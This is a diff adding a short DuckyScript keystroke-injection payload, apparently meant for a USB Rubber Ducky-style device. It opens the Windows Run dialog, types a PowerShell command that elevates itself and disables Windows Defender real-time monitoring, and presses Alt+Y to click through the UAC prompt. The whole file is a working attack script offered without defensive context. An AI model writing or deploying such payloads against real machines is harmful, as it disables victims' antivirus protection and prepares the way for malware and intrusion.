@@ -1,0 +1,11 @@
+REM Disable Windows Defender real-time protection (requires admin)
+REM UAC prompt will appear - user must accept or this will fail
+DEFAULT_DELAY 100
+DELAY 500
+GUI r
+DELAY 800
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host Done'"
+ENTER
+DELAY 2000
+REM Press ALT+Y to accept UAC if it appears
+ALT y
